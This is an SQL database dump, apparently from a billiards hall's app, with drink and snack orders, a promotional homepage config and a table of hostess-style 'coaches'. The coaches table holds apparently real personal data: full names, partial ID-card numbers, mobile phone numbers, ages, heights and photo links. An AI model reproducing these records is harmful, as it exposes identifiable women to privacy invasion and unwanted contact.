INSERT INTO orders VALUES(85,'TG1775391703013','普台5','[{"name":"鸭屎香柠檬茶","quantity":1,"price":18},{"name":"招牌柠檬茶","quantity":1,"price":18}]',36.0,'已完成','2026-04-05 12:21:43','2026-04-05 20:22:51','3970fd4b');
INSERT INTO orders VALUES(86,'TG1775393388771','普台27','[{"name":"草莓抹茶牛乳","quantity":1,"price":23},{"name":"老盐黄皮冰茶","quantity":1,"price":24}]',47.0,'已完成','2026-04-05 12:49:49','2026-04-05 20:56:34','312ba23d');
INSERT INTO orders VALUES(87,'TG1775393710972','普台27','[{"name":"西柚冰茶/苏打","quantity":1,"price":22}]',22.0,'已完成','2026-04-05 12:55:11','2026-04-05 20:56:29','312ba23d');
INSERT INTO orders VALUES(88,'TG1775394442049','TV台','[{"name":"东方树叶","quantity":1,"price":8},{"name":"冰红茶","quantity":1,"price":6}]',14.0,'已完成','2026-04-05 13:07:22','2026-04-05 21:08:12','1571a510');
INSERT INTO orders VALUES(89,'TG1775396404441','普台7','[{"name":"东方树叶","quantity":1,"price":8}]',8.0,'已完成','2026-04-05 13:40:04','2026-04-05 21:40:48','2cd0359');
INSERT INTO orders VALUES(90,'TG1775396918742','普台7','[{"name":"茶兀","quantity":1,"price":8}]',8.0,'已完成','2026-04-05 13:48:39','2026-04-05 21:51:10','72e6e845');
INSERT INTO orders VALUES(91,'TG1775396918832','普台7','[{"name":"茶兀","quantity":1,"price":8}]',8.0,'已完成','2026-04-05 13:48:39','2026-04-05 21:51:16','72e6e845');
INSERT INTO orders VALUES(92,'TG1775397770586','普台11','[{"name":"四洲虾条","quantity":1,"price":10},{"name":"泡鸭掌","quantity":1,"price":5}]',15.0,'已完成','2026-04-05 14:02:50','2026-04-05 22:08:21','600f8455');
INSERT INTO orders VALUES(93,'TG1775397775731','普台1','[{"name":"普洱茶（一杯）","quantity":1,"price":8},{"name":"百威新锐啤酒","quantity":1,"price":16},{"name":"王老吉凉茶","quantity":1,"price":6}]',30.0,'已完成','2026-04-05 14:02:55','2026-04-05 22:07:07','161b74cc');
INSERT INTO orders VALUES(94,'TG1775397838032','VIP5','[{"name":"鱼皮花生","quantity":1,"price":10},{"name":"烤肠","quantity":1,"price":8}]',18.0,'已完成','2026-04-05 14:03:58','2026-04-05 22:08:22','9cbab96');
INSERT INTO orders VALUES(95,'TG1775397889017','VIP5','[{"name":"泡鸭掌","quantity":3,"price":5}]',15.0,'已完成','2026-04-05 14:04:49','2026-04-05 22:08:24','9cbab96');
INSERT INTO orders VALUES(96,'TG1775397953817','VIP5','[{"name":"烤黑鸭脖","quantity":1,"price":3}]',3.0,'已完成','2026-04-05 14:05:54','2026-04-05 22:08:25','5bea5e03');
INSERT INTO orders VALUES(97,'TG1775398094202','普台11','[{"name":"烤肠","quantity":1,"price":8},{"name":"四洲栗一烧","quantity":1,"price":10}]',18.0,'已完成','2026-04-05 14:08:14','2026-04-05 22:09:15','600f8455');
INSERT INTO orders VALUES(98,'TG1775401820963','普台1','[{"name":"手套","quantity":1,"price":5}]',5.0,'已完成','2026-04-05 15:10:22','2026-04-05 23:12:23','5fbe4c1d');
INSERT INTO orders VALUES(99,'TG1775406090434','普台28','[{"name":"柠檬水","quantity":1,"price":10},{"name":"百岁山","quantity":1,"price":8},{"name":"鲜牛奶","quantity":1,"price":18}]',36.0,'已完成','2026-04-05 16:21:30','2026-04-06 00:23:45','312ba23d');
INSERT INTO orders VALUES(100,'TG1775409311528','普台20','[{"name":"椰树椰汁","quantity":1,"price":8},{"name":"可乐","quantity":1,"price":6}]',14.0,'已完成','2026-04-05 17:15:11','2026-04-06 01:17:50','3fbf7edf');
INSERT INTO orders VALUES(101,'TG1775415028829','普台13','[{"name":"百岁山","quantity":1,"price":8},{"name":"苏打水","quantity":1,"price":8}]',16.0,'已完成','2026-04-05 18:50:29','2026-04-06 02:51:24','3ea6e3bd');
INSERT INTO orders VALUES(102,'TG1775454529362','普台2','[{"name":"苏打水","quantity":1,"price":8},{"name":"酸梅汤","quantity":1,"price":6}]',14.0,'已完成','2026-04-06 05:48:49','2026-04-06 13:51:55','13e21ba2');
INSERT INTO orders VALUES(103,'TG1775462237915','普台28','[{"name":"王老吉凉茶","quantity":1,"price":6},{"name":"茉莉清茶","quantity":1,"price":6}]',12.0,'已完成','2026-04-06 07:57:18','2026-04-06 15:58:30','397920bd');
INSERT INTO orders VALUES(104,'TG1775469745768','斯诺克31','[{"name":"老盐黄皮冰茶","quantity":1,"price":24}]',24.0,'已完成','2026-04-06 10:02:26','2026-04-06 18:03:39','3970fd4b');
INSERT INTO orders VALUES(105,'TG1775470187891','斯诺克31','[{"name":"草莓抹茶牛乳","quantity":1,"price":23}]',23.0,'已完成','2026-04-06 10:09:48','2026-04-06 18:10:27','3970fd4b');
INSERT INTO orders VALUES(106,'TG1775472362596','VIP3','[{"name":"招牌柠檬茶","quantity":4,"price":18}]',72.0,'已完成','2026-04-06 10:46:02','2026-04-06 18:47:59','6bedca04');
INSERT INTO orders VALUES(107,'TG1775473442842','普台13','[{"name":"烤肠","quantity":2,"price":8},{"name":"泡鸭掌","quantity":1,"price":5},{"name":"小面筋","quantity":1,"price":3}]',24.0,'已完成','2026-04-06 11:04:03','2026-04-06 19:06:06','10d09273');
INSERT INTO orders VALUES(108,'TG1775474120885','普台28','[{"name":"手套","quantity":1,"price":5}]',5.0,'已完成','2026-04-06 11:15:21','2026-04-06 19:16:39','63919e04');
INSERT INTO orders VALUES(109,'TG1775479789133','斯诺克31','[{"name":"茉香柠檬茶","quantity":1,"price":18},{"name":"珍珠奶茶","quantity":1,"price":18},{"name":"椰丸奶茶","quantity":1,"price":18}]',54.0,'已完成','2026-04-06 12:49:49','2026-04-06 20:50:47','5be04058');
INSERT INTO orders VALUES(110,'TG1775482701675','斯诺克31','[{"name":"珍珠奶茶","quantity":1,"price":18}]',18.0,'已完成','2026-04-06 13:38:21','2026-04-06 21:41:10','6953430d');
INSERT INTO orders VALUES(111,'TG1775483774019','VIP8','[{"name":"美式","quantity":1,"price":18},{"name":"红牛","quantity":1,"price":10},{"name":"草莓抹茶牛乳","quantity":1,"price":23},{"name":"茉香柠檬茶","quantity":1,"price":18}]',69.0,'已完成','2026-04-06 13:56:14','2026-04-06 22:53:03','600f8455');
INSERT INTO orders VALUES(112,'TG1775485020899','BOSS3','[{"name":"茉香柠檬茶","quantity":1,"price":18},{"name":"红枣桂圆茶","quantity":1,"price":25}]',43.0,'已完成','2026-04-06 14:17:01','2026-04-06 22:53:05','2c4b9e0');
INSERT INTO orders VALUES(113,'TG1775486197847','VIP8','[{"name":"柠檬水","quantity":1,"price":10}]',10.0,'已完成','2026-04-06 14:36:38','2026-04-06 22:53:08','312ba23d');
INSERT INTO orders VALUES(114,'TG1775486265098','BOSS3','[{"name":"六宫格果盘","quantity":1,"price":78}]',78.0,'已完成','2026-04-06 14:37:45','2026-04-06 22:53:10','2c4b9e0');
INSERT INTO orders VALUES(115,'TG1775486650852','BOSS1','[{"name":"柠檬水","quantity":2,"price":10}]',20.0,'已完成','2026-04-06 14:44:11','2026-04-06 22:53:13','312ba23d');
INSERT INTO orders VALUES(116,'TG1775488928176','普台20','[{"name":"红牛","quantity":1,"price":10},{"name":"东方树叶","quantity":1,"price":8},{"name":"可乐","quantity":1,"price":6}]',24.0,'已完成','2026-04-06 15:22:08','2026-04-06 23:23:36','7df70b1a');
INSERT INTO orders VALUES(117,'TG1775493131663','普台10','[{"name":"红烧牛肉干拌面","quantity":1,"price":10}]',10.0,'已完成','2026-04-06 16:32:12','2026-04-07 00:32:58','434484ed');
INSERT INTO orders VALUES(118,'TG1775495643891','VIP8','[{"name":"茉香柠檬茶","quantity":1,"price":18},{"name":"可乐","quantity":2,"price":6},{"name":"生椰拿铁","quantity":1,"price":22}]',52.0,'已取消','2026-04-06 17:14:04','2026-04-07 01:14:54','600f8455');
INSERT INTO orders VALUES(119,'TG1775495959674','VIP8','[{"name":"六宫格果盘","quantity":1,"price":78},{"name":"烤肠","quantity":3,"price":8}]',102.0,'已完成','2026-04-06 17:19:19','2026-04-07 01:25:24','600f8455');
INSERT INTO orders VALUES(120,'TG1775497645531','普台22','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-04-06 17:47:25','2026-04-07 01:48:47','55c0a728');
INSERT INTO orders VALUES(121,'TG1775500321163','VIP3','[{"name":"if椰子水","quantity":1,"price":10},{"name":"百岁山","quantity":2,"price":8}]',26.0,'已完成','2026-04-06 18:32:01','2026-04-07 04:18:19','470f0b39');
INSERT INTO orders VALUES(122,'TG1775548740735','普台2','[{"name":"50和成天下","quantity":1,"price":58}]',58.0,'已完成','2026-04-07 07:59:01','2026-04-07 16:00:19','3dd1ae0a');
INSERT INTO orders VALUES(123,'TG1775551755454','普台2','[{"name":"椰丸奶茶","quantity":1,"price":18}]',18.0,'已完成','2026-04-07 08:49:15','2026-04-07 16:50:52','3dd1ae0a');
INSERT INTO orders VALUES(124,'TG1775563633671','普台11','[{"name":"茉莉清茶","quantity":1,"price":6}]',6.0,'已完成','2026-04-07 12:07:13','2026-04-07 20:10:02','a3fe83f');
INSERT INTO orders VALUES(125,'TG1775564321760','普台21','[{"name":"粗荷花 代购","quantity":1,"price":50}]',50.0,'已完成','2026-04-07 12:18:42','2026-04-07 20:20:47','9ed6e7b');
INSERT INTO orders VALUES(126,'TG1775566529910','普台28','[{"name":"四洲虾条","quantity":1,"price":10}]',10.0,'已取消','2026-04-07 12:55:30','2026-04-07 20:59:15','a6718a4');
INSERT INTO orders VALUES(127,'TG1775566574110','普台26','[{"name":"手套","quantity":1,"price":5},{"name":"百岁山","quantity":1,"price":8}]',13.0,'已完成','2026-04-07 12:56:14','2026-04-07 20:57:09','9ed6e7b');
INSERT INTO orders VALUES(128,'TG1775567465430','普台28','[{"name":"烤肠","quantity":2,"price":8},{"name":"粗荷花 代购","quantity":1,"price":50},{"name":"香脆肠","quantity":1,"price":3},{"name":"三得利乌龙茶","quantity":2,"price":8}]',85.0,'已完成','2026-04-07 13:11:05','2026-04-07 21:13:52','a6718a4');
INSERT INTO orders VALUES(129,'TG1775567905767','普台23','[{"name":"三得利乌龙茶","quantity":1,"price":8},{"name":"可乐","quantity":1,"price":6},{"name":"屈臣氏沙示汽水","quantity":1,"price":6}]',20.0,'已完成','2026-04-07 13:18:26','2026-04-07 21:19:41','9ed6e7b');
INSERT INTO orders VALUES(130,'TG1775567929642','普台23','[{"name":"if椰子水","quantity":1,"price":10}]',10.0,'已完成','2026-04-07 13:18:49','2026-04-07 21:19:43','9ed6e7b');
INSERT INTO orders VALUES(131,'TG1775569028043','BOSS2','[{"name":"乖媳妇凤爪","quantity":1,"price":12},{"name":"开心果","quantity":1,"price":25},{"name":"墨鱼丝","quantity":1,"price":18},{"name":"四洲栗一烧","quantity":1,"price":10},{"name":"乐事薯片","quantity":1,"price":10}]',75.0,'待处理','2026-04-07 13:37:08',NULL,'32363614');
CREATE TABLE home_config (
          id INTEGER PRIMARY KEY CHECK (id = 1),
          banner_image TEXT,
          banner_title TEXT DEFAULT '充值送台费活动',
          banner_desc TEXT DEFAULT '充值满500送50元台费，多充多送',
          hot_products TEXT,
          popular_coaches TEXT,
          updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
        , notice TEXT DEFAULT '', hot_vip_rooms TEXT DEFAULT '');
INSERT INTO home_config VALUES(1,NULL,'充值送台费活动','大厅台费充500得1000，今晚你就是"杆"王！','["烤肠","珍珠奶茶","椰青美式","无穷鸡腿","烤黑鸭脖","辣番茄鸡蛋牛肉面"]','[]','2026-03-26 01:44:43','欢迎光临天宫国际，超豪台球城！','[10,9,11,7]');
CREATE TABLE IF NOT EXISTS "coaches" (
    coach_no INTEGER PRIMARY KEY AUTOINCREMENT,
    employee_id TEXT,
    stage_name TEXT,
    real_name TEXT,
    id_card_last6 TEXT,
    level TEXT DEFAULT '初级',
    price REAL DEFAULT 2.3,
    age INTEGER,
    height INTEGER,
    photos TEXT,
    video TEXT,
    intro TEXT,
    is_popular INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
, videos TEXT, popularity INTEGER DEFAULT 0, status TEXT DEFAULT '全职', phone TEXT, shift TEXT DEFAULT '早班');
INSERT INTO coaches VALUES(10001,'1','歪歪','余莉桦','201345','高级',109.0,100,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774512156393_71b17482.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774511872496_c8b9f349.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774511978964_4fc7c172.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774512053296_7be60b33.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774512194848_5bbf8735.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774512245030_76710e1f.jpg"]',NULL,'女神经～有趣的灵魂万里挑一',0,'2026-03-11 14:10:33','2026-03-26 19:12:32','[]',60,'全职','16675852676','早班');
INSERT INTO coaches VALUES(10002,'2','陆飞','陆飞凤','230922','高级',109.0,23,158,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061941314818.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775124478495_96bd3251.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1775124497946_77fd8c2c.jpg"]',NULL,'勾拉弹跳样样精通',0,'2026-03-11 14:10:33','2026-04-02 10:08:18','[]',56,'全职','18775703862','早班');
INSERT INTO coaches VALUES(10003,'3','六六','农槟榕','251429','女神',129.0,21,166,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061944406975.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-28 21:29:31','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774704569685_7d27ed18.mp4"]',66,'全职','19814455887','早班');
INSERT INTO coaches VALUES(10005,'5','芝芝','黄俞芝','151027','中级',99.0,18,158,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608151790_f8330c95.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061943588994.jpg"]',NULL,'红🀄️选手申请出战！',0,'2026-03-11 14:10:33','2026-03-27 18:54:59','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608163316_41d00b08.mp4"]',10,'全职','17520240130','早班');
INSERT INTO coaches VALUES(10007,'7','小月','梁月姬','246101','中级',99.0,19,168,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061940527158.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608247893_6f44e84d.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608382341_e334fee0.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 18:46:32','[]',50,'全职','13420329198','早班');
INSERT INTO coaches VALUES(10008,'8','小雨','简莹','127022','中级',99.0,20,164,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061956253735.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774958617794_1b803eeb.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-31 20:03:38','[]',32,'全职','15907641078','早班');
INSERT INTO coaches VALUES(10009,'10','momo','莫杏娟','024149','女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061942596815.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610058142_30d90923.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610078126_6a2e666f.png","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610230343_600d96b7.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610387594_40b6a9a0.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 19:26:18','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610766143_13fb3d76.mp4"]',29,'全职','13432101600','早班');
INSERT INTO coaches VALUES(10010,'11',' 小怡','张甄怡','283122','女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061911545518.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-04-05 15:06:58','[]',8,'离职','13631182601','早班');
INSERT INTO coaches VALUES(10011,'12','十七','李恬宇','171542','女神',129.0,18,170,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061943206462.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609949557_6ad85e7d.jpg"]',NULL,'球技高超，酒量好！',0,'2026-03-11 14:10:33','2026-03-27 19:12:37','[]',88,'全职','13435764691','早班');
INSERT INTO coaches VALUES(10012,'15','柳柳','梁海柳','292522','中级',99.0,20,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608944624_155c6abf.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061943071895.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609292699_fefb2855.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 19:03:49','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609428131_124c1f42.mp4"]',20,'全职','15016149279','早班');
INSERT INTO coaches VALUES(10013,'16','雪梨','李雪灵','18074x','中级',99.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061942054156.jpg"]',NULL,NULL,0,'2026-03-11 14:10:33','2026-03-12 13:56:01',NULL,7,'全职','15382776509','早班');
INSERT INTO coaches VALUES(10014,'17','静香','邓敏莹','211028','中级',99.0,20,158,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774354392549_db4a5c66.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-25 15:00:53','[]',25,'全职','19928028091','早班');
INSERT INTO coaches VALUES(10015,'18','莫莫','莫善茵','063341','高级',109.0,25,170,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061941521516.jpg"]',NULL,'会玩智能手机',0,'2026-03-11 14:10:33','2026-03-28 16:16:11','[]',11,'全职','19860013436','早班');
INSERT INTO coaches VALUES(10016,'19','茜茜','黄梦雪','127022','初级',89.0,NULL,180,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061944168596.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608874426_35bc33d8.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608884035_4acf516c.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608900972_bd8c446e.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 18:55:44','[]',20,'全职','15016142731','早班');
INSERT INTO coaches VALUES(10017,'20','恩恩','杜娜','254962','中级',99.0,20,162,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061941157249.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610283359_2085b010.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 19:18:08','[]',18,'全职','19938786749','早班');
INSERT INTO coaches VALUES(10018,'21','球球','曾兮涵','30782X','高级',109.0,23,158,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061956318019.jpg"]',NULL,'要是打台球的话，东南西北都顺路',0,'2026-03-11 14:10:33','2026-03-27 19:13:38','[]',13,'全职','15989148331','早班');
INSERT INTO coaches VALUES(10020,'23','小土豆','杨美彩','117627','高级',109.0,21,160,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061945002650.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608517198_2ffddb51.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608532194_2773263c.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608543636_54dbdcab.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608571537_565a7ed3.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-04-05 15:16:12','[]',16,'兼职','13157476309','早班');
INSERT INTO coaches VALUES(10021,'25','周周','周寒兴','091644','中级',99.0,22,156,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061943271259.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451463738_39d49c60.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451620787_1e32ebfb.png","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451694667_7d0d9f9a.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774521482647_36e7fac4.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774521915638_4c9cd575.png"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-26 18:45:16','[]',10,'全职','17785656489','早班');
INSERT INTO coaches VALUES(10022,'100','四瑶','','142440','女神',129.0,19,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451950385_4be6f62e.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603062000386407.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451809108_daa75413.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451845550_8c6c0881.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451927430_e4a2c55b.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774451996629_180f8052.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-25 23:21:42','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774452029847_b0514964.mp4"]',17,'全职','15398309503','早班');
INSERT INTO coaches VALUES(10023,'27','小白','徐清','225527','中级',99.0,21,160,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061946193843.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-28 02:52:53','[]',13,'全职','19523854785','早班');
INSERT INTO coaches VALUES(10024,'28','逍遥',NULL,NULL,'女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061955528527.jpg"]',NULL,NULL,0,'2026-03-11 14:10:33','2026-03-11 14:10:33',NULL,9,'全职',NULL,'早班');
INSERT INTO coaches VALUES(10025,'29','青子','陆瑶','222620','女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061942368916.jpg"]',NULL,NULL,0,'2026-03-11 14:10:33','2026-03-12 13:56:01',NULL,17,'全职','15398882307','早班');
INSERT INTO coaches VALUES(10026,'30','江江','谢咏怡','151029','高级',109.0,24,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609992738_5969fb3b.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061944499632.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609962172_ee1df6f5.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610064434_2a185415.jpg"]',NULL,'吃饭睡觉打豆豆',0,'2026-03-11 14:10:33','2026-03-27 19:17:00','[]',15,'全职','18475581285','早班');
INSERT INTO coaches VALUES(10027,'31','小涵','李涵','191929','女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061941445468.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774521615201_e5c22a17.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774521647036_c23b0cde.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-26 18:40:47','[]',15,'全职','15675485090','早班');
INSERT INTO coaches VALUES(10028,'33','晴天','严思婷','074227','初级',89.0,20,158,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061942453239.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610063615_b891e9eb.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610243125_bb67e7ce.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 19:17:37','[]',13,'全职','15202088258','早班');
INSERT INTO coaches VALUES(10030,'35','多多','徐冉冉','270920','女神',129.0,NULL,NULL,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774458344256_e40db519.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774458307547_77d03fb3.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061956151782.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-26 01:07:47','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774458382331_78389d7d.mp4"]',25,'全职','18925304483','早班');
INSERT INTO coaches VALUES(10031,'36','芊芊','胡浩敏','290927','女神',129.0,24,160,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061943145562.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608129962_0041f767.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608161113_19ff72ec.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608170881_e4c45121.jpg"]',NULL,'性格开朗活泼 能喝酒 ',0,'2026-03-11 14:10:33','2026-04-05 19:17:48','[]',14,'全职','13435711293','早班');
INSERT INTO coaches VALUES(10032,'37','三七','李海运','24482X','高级',109.0,NULL,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774454428463_268bdaff.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774454548280_d92464fc.png","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774455042893_c4949045.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774961391782_14e9da0f.jpg"]',NULL,'追分麻将选手',0,'2026-03-11 14:10:33','2026-03-31 20:50:44','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774454880253_ccf9e4a9.mp4","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774961412503_6e1444d3.mp4","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774961435799_bd2d0013.mp4"]',33,'全职','18300052564','早班');
INSERT INTO coaches VALUES(10033,'39','饼饼','鄢冰冰','237646','女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061942212058.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-04-05 15:07:22','[]',16,'离职','13450981867','早班');
INSERT INTO coaches VALUES(10034,'40','羊羊','唐洋丹','254962','女神',129.0,21,169,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061956042449.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608122182_3358fefa.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 18:42:14','[]',16,'全职','15362196411','早班');
INSERT INTO coaches VALUES(10035,'42','晓墨','徐玲','074227','女神',129.0,NULL,NULL,'["https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061945075225.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-04-05 15:07:29','[]',9,'离职','15502096735','早班');
INSERT INTO coaches VALUES(10036,'49','快乐','刘慧','061022','女神',129.0,21,165,'["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774610303469_78e83602.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609497967_c2b4de01.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609369056_6e05fda6.jpg","https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603061944333209.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774608380031_6b486884.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609531306_a4d93f61.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609680393_767bf3d0.jpg","https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609785087_5f08832b.jpg"]',NULL,'',0,'2026-03-11 14:10:33','2026-03-27 19:18:39','["https://resource-images-sh.oss-cn-shanghai.aliyuncs.com/coaches/1774609934987_a5be9679.mp4"]',48,'全职','13420347043','早班');
